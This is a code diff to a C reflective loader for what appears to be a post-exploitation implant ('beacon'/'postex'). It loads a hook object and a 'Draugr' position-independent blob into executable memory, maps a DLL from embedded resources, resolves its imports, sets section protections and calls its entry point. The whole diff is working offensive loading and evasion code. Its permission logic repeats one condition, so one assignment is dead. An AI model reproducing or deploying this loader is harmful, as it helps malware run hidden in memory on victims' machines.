@@ -29,6 +29,7 @@ __attribute__((noinline, no_reorder)) void go(void * loaderArgument) {
 #include "hash.h"
 #include "resolve_eat.h"
 #include "proxy.h"
+#include "memory.h"
 
 #define memset(x, y, z) __stosb((unsigned char *)x, y, z);
 #define memcpy(x, y, z) __movsb((unsigned char *)x, (unsigned char *)y, z);
@@ -126,11 +127,21 @@ typedef struct {
     char  value[];
 } RESOURCE;
 
-char __DLLDATA__[0] __attribute__((section("my_data")));
-char __PICDATA__[0] __attribute__((section("my_proxy")));
-char __HOKDATA__[0] __attribute__((section("my_hooks")));
+typedef struct {
+	#if DEBUG
+	char data[8192];
+	char code[16384];
+	#else
+	char data[4096];
+	char code[12288];
+	#endif
+} PICO;
 
-typedef void (*PICOHOOK_ENTRY)(IMPORTFUNCS * funcs, char * dllbase, DWORD dllsz);
+char __POSTEX__[0] __attribute__((section("postex")));
+char __DRAUGR__[0] __attribute__((section("draugr")));
+char __HOOKS__[0]  __attribute__((section("hooks")));
+
+typedef void (*PICOHOOK_ENTRY)(IMPORTFUNCS * funcs, MEMORY_LAYOUT * layout);
 
 char * loader_start() {
 #ifdef WIN_X86
@@ -223,79 +234,159 @@ void protect_memory_threadpool(void * baseAddress, SIZE_T size, ULONG newProtect
 #include "debug.h"
 #endif
 
-void reflectiveLoader(WIN32FUNCS * funcs, LAYOUT * layout, char * dll, DLLDATA * dllData, LPVOID loaderArgument)
+void fixSectionMemoryPermissions(DLLDATA * dll, char * src, char * dst, WIN32FUNCS * funcs, MEMORY_REGION * region)
 {
-	char * hooks;
+	DWORD                   numberOfSections = dll->NtHeaders->FileHeader.NumberOfSections;
+	IMAGE_SECTION_HEADER  * sectionHdr       = NULL;
+	void                  * sectionDst       = NULL;
+	DWORD                   sectionSize      = 0;
+	DWORD                   newProtect       = 0;
 
-	/* Time to load the hook PICO */
-	hooks = GETRESOURCE(__HOKDATA__);
+	sectionHdr  = (IMAGE_SECTION_HEADER *)PTR_OFFSET(dll->OptionalHeader, dll->NtHeaders->FileHeader.SizeOfOptionalHeader);
 
-	#ifdef DEBUG
-	PIC_STRING(picosz, "[POSTEX] HookPicoDataSize: %d\nHookPicoCodeSize: %d\n");
-	dprintf((IMPORTFUNCS *)funcs, picosz, PicoDataSize(hooks), PicoCodeSize(hooks));
-	#endif
+	for (int x = 0; x < numberOfSections; x++)
+	{
+		sectionDst  = dst + sectionHdr->VirtualAddress;
+		sectionSize = sectionHdr->SizeOfRawData;
 
-	/* Load it into the layout */
-	PicoLoad((IMPORTFUNCS *)funcs, hooks, layout->hookcode, layout->hookdata);
+		if (sectionHdr->Characteristics & IMAGE_SCN_MEM_WRITE) {
+			newProtect = PAGE_WRITECOPY;
+		}
+		if (sectionHdr->Characteristics & IMAGE_SCN_MEM_READ) {
+			newProtect = PAGE_READONLY;
+		}
+		if ((sectionHdr->Characteristics & IMAGE_SCN_MEM_READ) && (sectionHdr->Characteristics & IMAGE_SCN_MEM_WRITE)) {
+			newProtect = PAGE_READWRITE;
+		}
+		if (sectionHdr->Characteristics & IMAGE_SCN_MEM_EXECUTE) {
+			newProtect = PAGE_EXECUTE;
+		}
+		if ((sectionHdr->Characteristics & IMAGE_SCN_MEM_EXECUTE) && (sectionHdr->Characteristics & IMAGE_SCN_MEM_READ)) {
+			newProtect = PAGE_EXECUTE_WRITECOPY;
+		}
+		if ((sectionHdr->Characteristics & IMAGE_SCN_MEM_EXECUTE) && (sectionHdr->Characteristics & IMAGE_SCN_MEM_READ)) {
+			newProtect = PAGE_EXECUTE_READ;
+		}
+		if ((sectionHdr->Characteristics & IMAGE_SCN_MEM_READ) && (sectionHdr->Characteristics & IMAGE_SCN_MEM_WRITE) && (sectionHdr->Characteristics & IMAGE_SCN_MEM_EXECUTE)) {
+			newProtect = PAGE_EXECUTE_READWRITE;
+		}
 
-	/* Make the code section RX */
-	protect_memory_threadpool(layout->hookcode, PicoCodeSize(hooks), PAGE_EXECUTE_READ, funcs);
+		/* set new permission */
+		protect_memory_threadpool(sectionDst, sectionSize, newProtect, funcs);
 
-	/* Call its entry point */
-	((PICOHOOK_ENTRY)PicoEntryPoint(hooks, layout->hookcode))((IMPORTFUNCS *)funcs, layout->dllbase, SizeOfDLL(dllData));
+		/* track memory */
+		region->sections[x].baseAddress     = sectionDst;
+		region->sections[x].size            = sectionSize;
+		region->sections[x].currentProtect  = newProtect;
+		region->sections[x].previousProtect = newProtect;
 
-	/* Now load the DLL */
-	LoadDLL(dllData, dll, layout->dllbase);
-	ProcessImports((IMPORTFUNCS *)funcs, dllData, layout->dllbase);
-
-	/* Get its entry point */
-	DLLMAIN_FUNC entryPoint = EntryPoint(dllData, layout->dllbase);
-
-	/* yolo this RWX for now */
-	protect_memory_threadpool(layout->dllbase, SizeOfDLL(dllData), PAGE_EXECUTE_READWRITE, funcs);
-
-	/* Call it twice */
-	entryPoint((HINSTANCE)layout->dllbase, DLL_PROCESS_ATTACH, NULL);
-	entryPoint((HINSTANCE)loader_start(), DLL_POSTEX_START, loaderArgument);
+		/* advance to our next section */
+		sectionHdr++;
+	}
 }
 
-void setupProxy(LPVOID loaderArgument)
+void reflectiveLoader(WIN32FUNCS * funcs, MEMORY_LAYOUT * layout, void * loaderArgument)
 {
-	WIN32FUNCS   funcs;
-	char       * dll;
-	DLLDATA      dllData;
-	LAYOUT     * layout;
-	RESOURCE   * pic;
+	char    * hookSrc;
+	PICO    * hookDst;
+	char    * dllSrc;
+	DLLDATA   dllData;
+	char    * dllDst;
+
+	/* Time to load the hook PICO */
+	hookSrc = GETRESOURCE(__HOOKS__);
+
+	/* Allocate memory for it */
+	hookDst = (PICO *)allocate_memory_threadpool(sizeof(PICO), PAGE_READWRITE, funcs);
+
+	/* Load it into memory */
+	PicoLoad((IMPORTFUNCS *)funcs, hookSrc, hookDst->code, hookDst->data);
+
+	/* Make the code section RX */
+	protect_memory_threadpool(hookDst->code, PicoCodeSize(hookSrc), PAGE_EXECUTE_READ, funcs);
+
+	/* Fill layout info */
+	layout->hooks.baseAddress                 = (char *)hookDst;
+	layout->hooks.size                        = sizeof(PICO);
+	layout->hooks.sections[0].baseAddress     = hookDst->data;
+	layout->hooks.sections[0].size            = PicoDataSize(hookSrc);
+	layout->hooks.sections[0].currentProtect  = PAGE_READWRITE;
+	layout->hooks.sections[0].previousProtect = PAGE_READWRITE;
+	layout->hooks.sections[1].baseAddress     = hookDst->code;
+	layout->hooks.sections[1].size            = PicoCodeSize(hookSrc);
+	layout->hooks.sections[1].currentProtect  = PAGE_EXECUTE_READ;
+	layout->hooks.sections[1].previousProtect = PAGE_EXECUTE_READ;
+
+	/* Get PICO entry point */
+	PICOHOOK_ENTRY picoEntry = (PICOHOOK_ENTRY)PicoEntryPoint(hookSrc, hookDst->code);
+
+	/* Call it to install the hooks */
+	picoEntry((IMPORTFUNCS *)funcs, layout);
+
+	/* Now load the DLL */
+	dllSrc = GETRESOURCE(__POSTEX__);
+
+	/* Parse the headers */
+	ParseDLL(dllSrc, &dllData);
+
+	/* Allocate memory for DLL */
+	dllDst = allocate_memory_threadpool(SizeOfDLL(&dllData), PAGE_READWRITE, funcs);
+
+	/* Load it into memory */
+	LoadDLL(&dllData, dllSrc, dllDst);
+	ProcessImports((IMPORTFUNCS *)funcs, &dllData, dllDst);
+
+	layout->beacon.baseAddress = dllDst;
+	layout->beacon.size        = SizeOfDLL(&dllData);
+
+	/* Fix section memory permissions */
+	fixSectionMemoryPermissions(&dllData, dllSrc, dllDst, funcs, &layout->beacon);
+
+	/* Call hook entry point again to provide the updated memory layout */
+	picoEntry((IMPORTFUNCS *)funcs, layout);
+
+	/* Get its entry point */
+	DLLMAIN_FUNC dllEntry = EntryPoint(&dllData, dllDst);
+
+	/* Call it twice */
+	dllEntry((HINSTANCE)dllDst,         DLL_PROCESS_ATTACH, NULL);
+	dllEntry((HINSTANCE)loader_start(), DLL_POSTEX_START,   loaderArgument);
+}
+
+void setupProxy(void * loaderArgument)
+{
+	WIN32FUNCS      funcs;
+	RESOURCE      * picSrc;
+	char          * picDst;
+	MEMORY_LAYOUT   layout;
 
 	/* Resolve functions */
 	findNeededFunctions(&funcs);
 
-	/* Grab the DLL because we need its size */
-	dll = GETRESOURCE(__DLLDATA__);
+	/* Grab the Draugr PIC */
+	picSrc = (RESOURCE *)GETRESOURCE(__DRAUGR__);
 
-	/* Parse the headers */
-	ParseDLL(dll, &dllData);
+	/* Allocate memory for it */
+	picDst = allocate_memory_threadpool(picSrc->length, PAGE_READWRITE, &funcs);
 
-	/* Allocate memory for everything we'll load */
-	layout = (LAYOUT *)allocate_memory_threadpool(sizeof(LAYOUT) + SizeOfDLL(&dllData), PAGE_READWRITE, &funcs);
-
-	#ifdef DEBUG
-	PIC_STRING(mem, "[POSTEX] draugrpic @ 0x%lp\nhookdata @ 0x%lp\nhookcode @ 0x%lp\ndllbase @ 0x%lp\n");
-	dprintf((IMPORTFUNCS *)&funcs, mem, layout->draugrpic, layout->hookdata, layout->hookcode, layout->dllbase);
+	#if DEBUG
+	PIC_STRING(dst, "PIC @ 0x%lp\n");
+	dprintf((IMPORTFUNCS *)&funcs, dst, picDst);
 	#endif
 
-	/* Grab the Draugr PIC */
-	pic = (RESOURCE *)GETRESOURCE(__PICDATA__);
-
 	/* Copy it into memory */
-	memcpy(layout->draugrpic, pic->value, pic->length);
+	memcpy(picDst, picSrc->value, picSrc->length);
 
 	/* Flip memory to RX */
-	protect_memory_threadpool(layout->draugrpic, pic->length, PAGE_EXECUTE_READ, &funcs);
+	protect_memory_threadpool(picDst, picSrc->length, PAGE_EXECUTE_READ, &funcs);
 
 	/* Set funcs field */
-	funcs.Draugr = (DRAUGR)(layout->draugrpic);
+	funcs.Draugr = (DRAUGR)(picDst);
+
+	/* Begin filling memory layout info */
+	layout.pic.baseAddress    = picDst;
+	layout.pic.size           = picSrc->length;
 
 	/* Carry on loading the rest */
-	reflectiveLoader(&funcs, layout, dll, &dllData, loaderArgument);
+	reflectiveLoader(&funcs, &layout, loaderArgument);
 }
